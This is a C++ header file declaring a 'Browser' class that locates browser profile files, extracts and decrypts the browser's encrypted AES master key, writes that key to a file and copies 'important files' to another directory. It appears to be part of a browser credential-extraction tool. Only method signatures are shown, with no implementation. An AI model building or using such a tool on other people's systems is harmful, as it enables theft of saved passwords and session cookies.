// Copyright (c) Nouman Tajik [github.com/tajiknomi]
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE. 1 

#pragma once

#include <iostream>
#include <vector>

#define AES_KEY_SIZE_IN_BYTES	 	32

class Browser {

private:
	std::string					BrowserName;			
	unsigned char AES_KEY[AES_KEY_SIZE_IN_BYTES + 1] = {};


public:		// Static variables
	static const std::vector<std::string> relativePaths;
	static const std::vector<std::string> impFiles;

private:
	std::string extractEncryptedKey(const std::string& jsonData);
	bool isImportantFile(const std::string& path);
	std::string getKeyFilePath(const std::string &path);
	std::string getEncryptedMasterKey(const std::string& keyFilePath);
	std::string decryptMasterKey(const std::string& encryptedKey);

public:
	void ExtractKey(const std::string &path);
	void ExtractFiles(const std::string &paths, const std::string& destinationDir);
	void ShowKey(void);
	void WriteExtractedKeyToFile(const std::string &path);
	std::string BrowserNameFinder(const std::string path);
};